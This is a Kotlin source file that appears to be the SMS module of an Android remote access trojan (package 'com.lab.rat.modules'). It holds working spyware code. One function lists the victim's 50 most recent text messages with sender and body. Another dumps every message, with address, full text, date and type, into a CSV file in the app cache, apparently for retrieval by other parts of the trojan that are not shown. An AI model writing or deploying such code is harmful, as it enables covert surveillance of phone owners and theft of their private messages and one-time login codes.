package com.lab.rat.modules

import android.content.Context
import android.provider.Telephony
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object SmsModule {
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private fun esc(v: String) = "\"${v.replace("\"", "\"\"")}\""

    fun list(ctx: Context): String {
        val sb = StringBuilder()
        var n = 0
        ctx.contentResolver.query(Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            null, null, "date DESC")?.use { c ->
            // paginação manual (bug #11): sem LIMIT embutido no sortOrder
            while (c.moveToNext() && n < 50) {
                val addr = c.getString(0) ?: "?"
                val body = (c.getString(1) ?: "").take(60).replace("\n", " ")
                sb.append("[${fmt.format(Date(c.getLong(2)))}] $addr: $body\n")
                n++
            }
        }
        if (n == 0) return "Nenhum SMS"
        return "Últimos $n SMS:\n$sb"
    }

    fun export(ctx: Context): File? {
        val rows = mutableListOf<String>()
        ctx.contentResolver.query(Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
                Telephony.Sms.DATE, Telephony.Sms.TYPE),
            null, null, "date DESC")?.use { c ->
            while (c.moveToNext()) {
                rows.add(listOf(
                    esc(c.getString(0) ?: ""),
                    esc(c.getString(1) ?: ""),
                    fmt.format(Date(c.getLong(2))),
                    c.getString(3) ?: ""
                ).joinToString(","))
            }
        } ?: return null
        if (rows.isEmpty()) return null
        val f = File(ctx.cacheDir, "sms_${System.currentTimeMillis()}.csv")
        f.writeText("endereco,corpo,data,tipo\n" + rows.joinToString("\n"))
        return f
    }
}
